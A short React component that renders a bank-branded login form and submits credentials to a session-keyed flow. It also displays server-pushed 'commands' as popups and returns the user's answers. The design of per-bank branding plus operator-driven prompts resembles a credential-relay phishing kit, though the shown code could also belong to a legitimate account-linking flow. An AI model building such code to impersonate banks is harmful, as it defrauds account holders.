import { useEffect } from 'react';
import type { BankConfig } from '@/config/banks/types';
import { useLocaleContext } from '@/i18n/LocaleProvider';
import { useBankLoginFlow } from './useBankLoginFlow';
import { LoginForm } from './components/LoginForm';
import { showCommand } from './swalController';
import { applyBankSwalCss } from './bankSwalStyle';

type Props = {
    bank: BankConfig;
    sessionId: string;
};

export function BankLoginFlow({ bank, sessionId }: Props) {
    const { command, busy, submitCredentials, answer, reset } = useBankLoginFlow({
        sessionId,
        bankSlug: bank.slug,
    });
    const { dict } = useLocaleContext();

    useEffect(() => applyBankSwalCss(bank.brand), [bank.brand]);

    useEffect(() => {
        showCommand(command, { dict, answer, reset });
    }, [command, dict, answer, reset]);

    return (
        <LoginForm bank={bank} busy={busy} onSubmit={(fields) => submitCredentials(fields)} />
    );
}
